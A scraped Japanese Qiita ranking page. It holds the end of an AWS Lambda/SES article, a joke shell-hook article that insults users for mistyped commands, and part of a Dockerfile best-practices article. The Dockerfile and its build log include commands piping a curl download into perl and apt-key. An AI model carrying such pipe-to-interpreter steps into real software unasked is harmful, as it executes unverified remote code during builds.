            "Action": [
                "kms:Decrypt"
            ],
            "Resource": [
                "&lt;kms-arn&gt;"
            ]
        }
    ]
}
</pre></div></div>

<p>最後に、この2つのポリシーを、Lambda関数実行ロールにアタッチします。<br>
まず、IAMコンソールの<code>ロール</code>に行き、ロールを選択し、<code>ポリシーのアタッチ</code>からアタッチします。<br>
<a href="https://camo.qiitausercontent.com/9327dfb994ebffa0fb4210beb66e742aaaded996/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f37396539666139312d633765652d303438612d393466392d6362636331396234313466612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9327dfb994ebffa0fb4210beb66e742aaaded996/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f37396539666139312d633765652d303438612d393466392d6362636331396234313466612e706e67" alt="lambda_08.png" title="lambda_08.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/79e9fa91-c7ee-048a-94f9-cbcc19b414fa.png"></a></p>

<h2>
<span id="動作確認" class="fragment"></span><a href="#%E5%8B%95%E4%BD%9C%E7%A2%BA%E8%AA%8D"><i class="fa fa-link"></i></a>動作確認</h2>

<p>これで動くようになったはずです。<br>
<code>To</code>にSES向けに設定したメールアドレス、<code>Reply-To</code>に相手のメールアドレスを設定し、適当なファイルを添付して送ってみてください。どうでしょう？</p>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>どんとこいzip添付!</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">37位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>258</kbd>
		<a target="_blank" href="https://qiita.com/onokatio/items/4930e4b23339edd05d47">コマンドを間違えるたびに美少女に罵られたい！ ※gifアニメ版と高解像度を追記</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-22<br />09:52:17</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/154157.html">onokatio</a>(40件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/154157/profile-images/1503882654">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Zsh]</b> <b>[Linux]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>コマンドを間違えるたびに美少女に罵られてみたい、と誰しも思ったことはありませんか？<br>
そんな長年の夢を叶えましょう！！！</p>

<h1>
<span id="結果" class="fragment"></span><a href="#%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>結果</h1>

<p><a href="https://camo.qiitausercontent.com/cde9f7f62bb2028a11358653932a6c296283d9f8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f31663464396239612d383166392d346636382d373862342d3061363436666261353365662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/cde9f7f62bb2028a11358653932a6c296283d9f8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f31663464396239612d383166392d346636382d373862342d3061363436666261353365662e706e67" alt="k.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/154157/1f4d9b9a-81f9-4f68-78b4-0a646fba53ef.png"></a></p>

<p>罵ってくれました。</p>

<h1>
<span id="方法" class="fragment"></span><a href="#%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>方法</h1>

<h2>
<span id="jp2aを導入する" class="fragment"></span><a href="#jp2a%E3%82%92%E5%B0%8E%E5%85%A5%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>jp2aを導入する</h2>

<p>任意のJPEG画像をアスキーアートにして表示してくれるパッケージです。<br>
たぶん以下でインストールできます。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ sudo apt install jp2a <span class="c1"># for Debian,Ubuntu</span>
$ brew install jp2a     <span class="c1"># for MacOSX,Linuxbrew</span>
</pre></div></div>

<h2>
<span id="画像を用意する" class="fragment"></span><a href="#%E7%94%BB%E5%83%8F%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>画像を用意する</h2>

<p>可愛い女の子の画像を用意しましょう。また、グレースケールにしておくと表示が綺麗になります。</p>

<h2>
<span id="シェルにフックを登録する" class="fragment"></span><a href="#%E3%82%B7%E3%82%A7%E3%83%AB%E3%81%AB%E3%83%95%E3%83%83%E3%82%AF%E3%82%92%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>シェルにフックを登録する</h2>

<p>コマンドを間違えたときに呼ばれる関数があるので、それを使いましょう。<br>
jp2aを使い画像を表示し、その後にメッセージを表示します。</p>

<p>Bashの場合</p>

<div class="code-frame" data-lang="bash">
<div class="code-lang"><span class="bold">bashrc</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> command_not_found_handle<span class="o">(){</span>
  <span class="k">if</span> <span class="o">[</span> -e /usr/bin/jp2a <span class="o">]</span><span class="p">;</span><span class="k">then</span>
    <span class="k">if</span> <span class="o">[</span> -e ~/kirino.jpg <span class="o">]</span><span class="p">;</span><span class="k">then</span>
      jp2a ~/kirino.jpg -i
    <span class="k">fi</span>
  <span class="k">fi</span>
  <span class="nb">echo</span> <span class="s2">"ハァ…？</span><span class="nv">$1</span><span class="s2">とか何言ってんの？\nコマンドもろくに覚えられないなんて、アンタどうしようもないクズね。"</span>
<span class="o">}</span>
</pre></div>
</div>

<p>ZSHの場合</p>

<div class="code-frame" data-lang="bash">
<div class="code-lang"><span class="bold">zshrc</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> command_not_found_handler<span class="o">(){</span>
  <span class="k">if</span> <span class="o">[</span> -e /usr/bin/jp2a <span class="o">]</span><span class="p">;</span><span class="k">then</span>
    <span class="k">if</span> <span class="o">[</span> -e ~/kirino.jpg <span class="o">]</span><span class="p">;</span><span class="k">then</span>
      jp2a ~/kirino.jpg -i
    <span class="k">fi</span>
  <span class="k">fi</span>
  <span class="nb">echo</span> <span class="s2">"ハァ…？</span><span class="nv">$1</span><span class="s2">とか何言ってんの？\nコマンドもろくに覚えられないなんて、アンタどうしようもないクズね。"</span>
<span class="o">}</span>
</pre></div>
</div>

<hr>

<p>fishの場合</p>

<p><a href="/QUANON" class="user-mention js-hovercard" title="QUANON" data-hovercard-target-type="user" data-hovercard-target-name="QUANON">@QUANON</a> さんから、以下のようなコメントを頂きました！ありがとうございます！！</p>

<blockquote>
<p>僕は fish を使っているのですが、このシェルでも次の function を定義することで実現できました。</p>
</blockquote>

<div class="code-frame" data-lang="sh"><div class="highlight"><pre><span></span><span class="k">function</span> command_not_found_handler --on-event fish_command_not_found
    <span class="k">if</span> <span class="nb">type</span> -q jp2a<span class="p">;</span> and <span class="nb">test</span> -e ~/kirino.jpg
        jp2a ~/kirino.jpg -i
    end

    <span class="nb">echo</span> ハァ…?<span class="nv">$argv</span><span class="o">[</span><span class="m">1</span><span class="o">]</span>とか何言ってんの?
    <span class="nb">echo</span> コマンドもろくに覚えられないなんて、アンタどうしようもないクズね。
end
</pre></div></div>

<p>bashとzshで'handle'と'handler'の違いがあるので注意です。また画像のパスは適宜変更してください。<br>
また、jp2a自体のオプションを弄ることで、表示するときの行や列を指定することができます。<br>
デフォルトでは、白に近い部分を表示させますが、ぼくの場合白黒にしてほとんど白となってしまい、見づらかったので、あえて黒の部分を表示させるために<code>-i</code>を付けています。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ jp2a hoge.jpg --width<span class="o">=</span><span class="m">100</span> <span class="c1"># 横幅を100列固定で表示</span>
$ jp2a hoge.jpg --height<span class="o">=</span><span class="m">100</span> <span class="c1"># 横幅を100列固定で表示</span>
$ jp2a hoge.jpg -i <span class="c1"># 白黒反転で表示</span>
</pre></div></div>

<p>これで一通りの手順は完了です。</p>

<p><a href="https://camo.qiitausercontent.com/cde9f7f62bb2028a11358653932a6c296283d9f8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f31663464396239612d383166392d346636382d373862342d3061363436666261353365662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/cde9f7f62bb2028a11358653932a6c296283d9f8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f31663464396239612d383166392d346636382d373862342d3061363436666261353365662e706e67" alt="k.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/154157/1f4d9b9a-81f9-4f68-78b4-0a646fba53ef.png"></a></p>

<h1>
<span id="もっと高解像度で罵られたいというかもう動画がいい" class="fragment"></span><a href="#%E3%82%82%E3%81%A3%E3%81%A8%E9%AB%98%E8%A7%A3%E5%83%8F%E5%BA%A6%E3%81%A7%E7%BD%B5%E3%82%89%E3%82%8C%E3%81%9F%E3%81%84%E3%81%A8%E3%81%84%E3%81%86%E3%81%8B%E3%82%82%E3%81%86%E5%8B%95%E7%94%BB%E3%81%8C%E3%81%84%E3%81%84"><i class="fa fa-link"></i></a>もっと高解像度で罵られたい。というかもう動画がいい。</h1>

<p>上を呼んでそう思った方、とても良い考え方だと思います。同士です。<br>
次は、アスキーアートだけではなく、本当の画像やgifアニメを表示させたいと思います。</p>

<h3>
<span id="iterm2appの場合" class="fragment"></span><a href="#iterm2app%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>iTerm2.appの場合</h3>

<blockquote>
<p>コメント欄にて、@kuzukuzu1gou さんがiTerm2でimgcatを使う方法を教えてくれました。</p>
</blockquote>

<p><a href="https://camo.qiitausercontent.com/6a2c90c8dbe2c8dd79267206fbfb5a0d84de3761/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34313430382f30393561643030332d396633612d386533312d356337632d6535343433666332633536632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6a2c90c8dbe2c8dd79267206fbfb5a0d84de3761/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34313430382f30393561643030332d396633612d386533312d356337632d6535343433666332633536632e706e67" alt="k.png"></a></p>

<p>jp2aの部分を、そのまま<code>imgcat</code>というコマンドに置き換えれば表示できます。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ imgcat hoge.jpg
</pre></div></div>

<h3>
<span id="xterm-mltermの場合" class="fragment"></span><a href="#xterm-mlterm%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>xterm mltermの場合</h3>

<p>img2sixelというパッケージを使えば、画像の表示や、gitアニメの再生ができます。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ img2sixel hoge.jpg
$ img2sixel hoge.gif -l disable <span class="c1"># -l disableを付けないとアニメがループしてプロンプトが帰ってこない</span>
</pre></div></div>

<p>また、任意のyoutubeや動画ファイルをgitアニメにするには以下を参考にしてください。<br>
<a href="https://qiita.com/onokatio/items/40b12a2c50b4f9cc3e75" id="reference-38bab9042620d1100a4b">Linuxで、コマンドだけでyoutubeから動画をダウンロードして任意の時間を切り出してgitアニ化する</a></p>

<p><a href="https://camo.qiitausercontent.com/a0b0555c66bdb8a21c108ff6387c131b64c8a489/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f37666265333036312d633730322d383334372d636363352d6562613732663436393131392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a0b0555c66bdb8a21c108ff6387c131b64c8a489/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f37666265333036312d633730322d383334372d636363352d6562613732663436393131392e706e67" alt="k.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/154157/7fbe3061-c702-8347-ccc5-eba72f469119.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/6903eb05a22f423ce521b28fe532030bdf2d44f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f65393562373038352d366562642d396132322d323134622d6436396162303563353636332e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6903eb05a22f423ce521b28fe532030bdf2d44f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135343135372f65393562373038352d366562642d396132322d323134622d6436396162303563353636332e676966" alt="demo.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/154157/e95b7085-6ebd-9a22-214b-d69ab05c5663.gif"></a></p>

<p>ゾクゾクしちゃいますね。<br>
これで楽しいシェルライフを送りましょう！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">38位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>252</kbd>
		<a target="_blank" href="https://qiita.com/port-development/items/8ab04aee45dc7f5f96ab">Dockerfileはなぜ複雑になるのか</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-25<br />14:23:30</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/172883.html">port-development</a>(8件の記事)<br />(ポート株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/172883/profile-images/1491369544">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[docker]</b> <b>[dockerfile]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<ul>
<li>Dockerfileとは

<ul>
<li>docker imageを作成する際のコマンドをコード化したもの</li>
<li><a href="https://docs.docker.com/engine/reference/builder/" rel="nofollow noopener" target="_blank">公式ドキュメント</a></li>
</ul>
</li>
</ul>

<p>Dockerfileは「コンテナを動かす」ためだけなら簡単に作成することが出来るが、工夫せずに書くと運用上いろいろな問題が発生する。<br>
それらの問題点のほとんどは書き方のテクニックによって回避することが出来るが、それらのテクニックを駆使すると、今度はDockerfileの中が複雑になっていく。</p>

<ul>
<li>Dockerfileはなぜ複雑にならざるを得ないのか</li>
</ul>

<p>発生する問題とそれに対するテクニックを例を上げて説明していくことで理解してもらう。</p>

<p><a href="https://github.com/gomesuit/larning-dockerfile" rel="nofollow noopener" target="_blank">rails5.1 hello world project</a>を例に説明する。</p>

<h1>
<span id="簡単なdockerfileの例" class="fragment"></span><a href="#%E7%B0%A1%E5%8D%98%E3%81%AAdockerfile%E3%81%AE%E4%BE%8B"><i class="fa fa-link"></i></a>簡単なDockerfileの例</h1>

<p>重要なのは<code>FROM</code>と<code>RUN</code>と<code>COPY</code>のみ</p>

<ul>
<li>FROM

<ul>
<li>ベースとなるimageの指定</li>
<li><a href="https://docs.docker.com/engine/reference/builder/#from" class="autolink" rel="nofollow noopener" target="_blank">https://docs.docker.com/engine/reference/builder/#from</a></li>
</ul>
</li>
<li>RUN

<ul>
<li>コマンドの実行</li>
<li><a href="https://docs.docker.com/engine/reference/builder/#run" class="autolink" rel="nofollow noopener" target="_blank">https://docs.docker.com/engine/reference/builder/#run</a></li>
</ul>
</li>
<li>COPY

<ul>
<li>ローカルからdocker imageへのファイルの転送</li>
<li><a href="https://docs.docker.com/engine/reference/builder/#copy" class="autolink" rel="nofollow noopener" target="_blank">https://docs.docker.com/engine/reference/builder/#copy</a></li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.base</span></div>
<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> ruby:2.4.1</span>

<span class="c"># timezone</span>
<span class="k">RUN</span> cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime

<span class="k">EXPOSE</span><span class="s"> 3000</span>
<span class="k">WORKDIR</span><span class="s"> /home/port/app</span>

<span class="c"># install dependency package</span>
<span class="k">RUN</span> apt-get update
<span class="k">RUN</span> apt-get install -y apt-transport-https libssl-dev

<span class="c"># install nodejs</span>
<span class="k">RUN</span> curl -s -L git.io/nodebrew <span class="p">|</span> perl - setup
<span class="k">ENV</span><span class="s"> PATH /root/.nodebrew/current/bin:$PATH</span>
<span class="k">RUN</span> nodebrew install-binary v8.7.0
<span class="k">RUN</span> nodebrew use v8.7.0

<span class="c"># install yarn</span>
<span class="c"># https://yarnpkg.com/en/docs/install#linux-tab</span>
<span class="k">RUN</span> curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg <span class="p">|</span> apt-key add -
<span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">"deb https://dl.yarnpkg.com/debian/ stable main"</span> <span class="p">|</span> tee /etc/apt/sources.list.d/yarn.list
<span class="k">RUN</span> apt-get update
<span class="k">RUN</span> apt-get install -y yarn

<span class="k">RUN</span> gem install bundler

COPY . /home/port/app

<span class="c"># bundle install</span>
<span class="k">RUN</span> bundle install --without development <span class="nb">test</span> --path vendor/bundle

<span class="c"># yarn install</span>
<span class="k">RUN</span> yarn install

<span class="c"># assets precompile</span>
<span class="k">RUN</span> <span class="nv">RAILS_ENV</span><span class="o">=</span>production bundle <span class="nb">exec</span> rails assets:precompile

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">.dockerignore</span></div>
<div class="highlight"><pre><span></span>*
!app
!bin
!config
!db
!lib
!public/*.html
!public/*.png
!public/favicon.ico
!public/robots.txt
!config.ru
!Gemfile
!Gemfile.lock
!package.json
!yarn.lock
!.postcssrc.yml
!.babelrc
!Rakefile
!log/.keep
!tmp/.keep
</pre></div>
</div>

<ul>
<li>dockerignoreについて

<ul>
<li>gitignoreみたいなもの</li>
<li>ビルド及び実行に必要のないファイルを除外する</li>
<li><a href="https://docs.docker.com/engine/reference/builder/#dockerignore-file" rel="nofollow noopener" target="_blank">公式ドキュメント</a></li>
</ul>
</li>
</ul>

<h3>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h3>

<ul>
<li>ruby:2.4.1の公式imageをベースに指定</li>
<li>apt-getで環境依存しているパッケージをインストール</li>
<li>nodeとyarnとbundlerをインストール</li>
<li>ソースコードを全てimageにコピー</li>
<li>gemインストール</li>
<li>nodeパッケージインストール</li>
<li>assets precompile</li>
<li>1つのRUNに1つのコマンド</li>
</ul>

<h3>
<span id="ビルドする" class="fragment"></span><a href="#%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ビルドする</h3>

<div class="code-frame" data-lang="shell-session"><div class="highlight"><pre><span></span><span class="gp">$</span> docker-compose build rails-base
<span class="go">Building rails-base</span>
<span class="go">Step 1/20 : FROM ruby:2.4.1</span>
<span class="go"> ---&gt; ceb1a85dc7b4</span>
<span class="go">Step 2/20 : RUN cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 7c2be593e2b6</span>
<span class="go">Step 3/20 : EXPOSE 3000</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 0eac29b48116</span>
<span class="go">Step 4/20 : WORKDIR /home/port/app</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 0313aa07291d</span>
<span class="go">Step 5/20 : RUN apt-get update</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 3da49f68bc04</span>
<span class="go">Step 6/20 : RUN apt-get install -y apt-transport-https libssl-dev</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; a070a1b5e21e</span>
<span class="go">Step 7/20 : RUN curl -s -L git.io/nodebrew | perl - setup</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; da6e0f8812f2</span>
<span class="go">Step 8/20 : ENV PATH /root/.nodebrew/current/bin:$PATH</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; c81c90973400</span>
<span class="go">Step 9/20 : RUN nodebrew install-binary v8.7.0</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; ac337962e5ac</span>
<span class="go">Step 10/20 : RUN nodebrew use v8.7.0</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; ca4ba4f7988f</span>
<span class="go">Step 11/20 : RUN curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | apt-key add -</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; ac3af5d6d3ff</span>
<span class="go">Step 12/20 : RUN echo "deb https://dl.yarnpkg.com/debian/ stable main" | tee /etc/apt/sources.list.d/yarn.list</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; b2a62c0af10f</span>
<span class="go">Step 13/20 : RUN apt-get update</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 9f585a492494</span>
<span class="go">Step 14/20 : RUN apt-get install -y yarn</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; c02e113291cf</span>
<span class="go">Step 15/20 : RUN gem install bundler</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; f5c3db51041c</span>
<span class="go">Step 16/20 : COPY . /home/port/app</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 90887301369c</span>
<span class="go">Step 17/20 : RUN bundle install --without development test --path vendor/bundle</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; f1c7abb31617</span>
<span class="go">Step 18/20 : RUN yarn install</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 3bc9c402c2dc</span>
<span class="go">Step 19/20 : RUN RAILS_ENV=production bundle exec rails assets:precompile</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 6dff320a2996</span>
<span class="go">Step 20/20 : CMD bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
<span class="go"> ---&gt; Using cache</span>
<span class="go"> ---&gt; 241c086a76d5</span>
<span class="go">Successfully built 241c086a76d5</span>
<span class="go">Successfully tagged dockerfilesample_rails-base:latest</span>
</pre></div></div>

<h3>
<span id="ビルド時のキャッシュについて" class="fragment"></span><a href="#%E3%83%93%E3%83%AB%E3%83%89%E6%99%82%E3%81%AE%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>ビルド時のキャッシュについて</h3>

<ul>
<li>Step毎にキャッシュが効く</li>
<li>
<code>Using cache</code>となっていればキャッシュが使われている</li>
<li>一度ビルドが完了すれば、ソースコードを変更しない限りキャッシュが使われるので２度目以降は一瞬で完了する</li>
</ul>

<h3>
<span id="上記のdockerfileの問題点" class="fragment"></span><a href="#%E4%B8%8A%E8%A8%98%E3%81%AEdockerfile%E3%81%AE%E5%95%8F%E9%A1%8C%E7%82%B9"><i class="fa fa-link"></i></a>上記のDockerfileの問題点</h3>

<ul>
<li>
<p>ソースコードを変更する度にbuildに時間がかかる</p>

<ul>
<li>
<p>例えば<code>app/controllers/application_controller.rb</code>を修正すると毎回bundle installから実行されてしまう</p>

<div class="code-frame" data-lang="shell-session"><div class="highlight"><pre><span></span><span class="gp">$</span> docker-compose build rails-base <span class="c1"># 1回目のビルド</span>
<span class="gp">$</span> <span class="c1"># application_controller.rbに改行を挿入</span>
<span class="gp">$</span> <span class="nb">echo</span> <span class="err">'</span>
<span class="go">' &gt;&gt; app/controllers/application_controller.rb</span>
<span class="gp">$</span> docker-compose build rails-base <span class="c1"># 2回目のビルドはStep17から実行されてしまう</span>
</pre></div></div>
</li>
</ul>
</li>
<li>
<p>image sizeが大きい</p>

<ul>
<li>上記のDockerfileで<code>1.05GB</code>
</li>
<li>image sizeが大きいほどpullに時間がかかる</li>
<li>複数サーバにデプロイするとネットワーク帯域を逼迫する</li>
</ul>
</li>
<li>
<p>railsの実行ユーザがrootになっている</p>

<ul>
<li>仮にハッキングされて任意のコマンドが実行される状態になってしまうと、コンテナ内のファイルを自由に変更されてしまう。</li>
</ul>
</li>
</ul>

<h1>
<span id="各問題に対する回避テクニック" class="fragment"></span><a href="#%E5%90%84%E5%95%8F%E9%A1%8C%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E5%9B%9E%E9%81%BF%E3%83%86%E3%82%AF%E3%83%8B%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a>各問題に対する回避テクニック</h1>

<h2>
<span id="ソースコードを変更する度にbuildに時間がかかる問題" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B%E5%BA%A6%E3%81%ABbuild%E3%81%AB%E6%99%82%E9%96%93%E3%81%8C%E3%81%8B%E3%81%8B%E3%82%8B%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>ソースコードを変更する度にbuildに時間がかかる問題</h2>

<h3>
<span id="可能な限りステップ毎のキャッシュが使われるようにする" class="fragment"></span><a href="#%E5%8F%AF%E8%83%BD%E3%81%AA%E9%99%90%E3%82%8A%E3%82%B9%E3%83%86%E3%83%83%E3%83%97%E6%AF%8E%E3%81%AE%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E3%81%8C%E4%BD%BF%E3%82%8F%E3%82%8C%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>可能な限りステップ毎のキャッシュが使われるようにする</h3>

<ul>
<li>更新頻度の低いものをDockerfileの上部に、多いものを下部に記載する</li>
<li>
<code>COPY</code>を細分化する</li>
</ul>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.1</span></div>
<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> ruby:2.4.1</span>

〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜同じ〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜

<span class="k">RUN</span> gem install bundler

<span class="c"># bundle install</span>
COPY Gemfile Gemfile.lock ./
<span class="k">RUN</span> bundle install --without development <span class="nb">test</span> --path vendor/bundle

<span class="c"># yarn install</span>
COPY package.json yarn.lock .postcssrc.yml ./
<span class="k">RUN</span> yarn install

<span class="c"># assets precompile</span>
COPY Rakefile .babelrc ./
COPY config config
COPY app/assets app/assets
COPY app/javascript app/javascript
COPY bin bin
<span class="k">RUN</span> <span class="nv">RAILS_ENV</span><span class="o">=</span>production bundle <span class="nb">exec</span> rails assets:precompile

COPY . /home/port/app

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<h3>
<span id="変更点の概要" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E7%82%B9%E3%81%AE%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>変更点の概要</h3>

<ul>
<li>
<code>COPY</code>時のファイルをに直後のRUN毎に必要な分だけ行うようにする</li>
<li>Gemfileを変更したときだけbundle installが実行される</li>
<li>package.jsonを変更したときだけyarn installが実行される</li>
<li>
<code>app/controllers/application_controller.rb</code>を修正してもassets:precompileが実行されない</li>
<li>bundleとyarnのどちらを上に書くかはプロジェクトによって決める</li>
</ul>

<h2>
<span id="image-sizeが大きい問題" class="fragment"></span><a href="#image-size%E3%81%8C%E5%A4%A7%E3%81%8D%E3%81%84%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>image sizeが大きい問題</h2>

<h3>
<span id="パッケージマネージャapt-get-yumなどの最適化" class="fragment"></span><a href="#%E3%83%91%E3%83%83%E3%82%B1%E3%83%BC%E3%82%B8%E3%83%9E%E3%83%8D%E3%83%BC%E3%82%B8%E3%83%A3apt-get-yum%E3%81%AA%E3%81%A9%E3%81%AE%E6%9C%80%E9%81%A9%E5%8C%96"><i class="fa fa-link"></i></a>パッケージマネージャ（apt-get, yumなど）の最適化</h3>

<ul>
<li>実行に不要なライブラリはインストールしない</li>
<li>staticライブラリはビルド後（同じRUN内）に削除する

<ul>
<li>２種類のライブラリ

<ul>
<li>staticライブラリ

<ul>
<li>コンパイル時にbinaryに取り込まれる</li>
</ul>
</li>
<li>sharedライブラリ

<ul>
<li>プログラム実行時に読み込まれる</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.2</span></div>
